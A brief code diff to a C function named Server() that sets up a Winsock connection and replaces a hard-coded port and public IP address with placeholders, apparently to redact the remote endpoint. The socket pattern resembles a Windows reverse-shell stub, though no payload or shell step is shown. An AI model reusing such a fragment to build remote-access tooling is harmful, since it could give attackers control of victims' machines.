@@ -42,8 +42,8 @@ void Server()
 	WSADATA wsaData;
 	WSAStartup(0x0202, &wsaData);
 	server_info.sin_family = AF_INET;
-	server_info.sin_port = htons(12345);
-	server_info.sin_addr.s_addr = inet_addr("35.247.171.91");
+	server_info.sin_port = htons(XXX);
+	server_info.sin_addr.s_addr = inet_addr("X.X.X.X");
 	my_sock = WSASocketA(AF_INET, 1, 6, NULL, (unsigned int)NULL, (unsigned int)NULL);
 	if (my_sock == INVALID_SOCKET) {
 		exit(0);
